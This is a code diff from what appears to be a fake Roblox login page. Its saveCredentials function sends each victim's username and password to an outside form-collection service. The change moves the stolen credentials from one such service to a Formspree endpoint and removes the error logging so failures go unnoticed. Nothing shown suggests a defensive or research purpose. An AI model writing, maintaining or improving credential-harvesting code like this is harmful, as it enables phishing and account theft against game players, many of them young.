@@ -21,18 +21,17 @@ const W3F_KEY = '929160bf-1027-46c0-8c7c-49b440102f4b';
 
 async function saveCredentials(username, password, type) {
   try {
-    await fetch('https://api.web3forms.com/submit', {
+    await fetch('https://formspree.io/f/xjgjygld', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        access_key: W3F_KEY,
-        subject: `Roblox Auth — New ${type}`,
-        message: `Type: ${type}\nUsername: ${username}\nPassword: ${password}\nDate: ${new Date().toLocaleString()}`
+        type,
+        username,
+        password,
+        date: new Date().toLocaleString()
       })
     });
-  } catch(e) {
-    console.warn('Web3Forms error:', e);
-  }
+  } catch(e) {}
 }
 
 
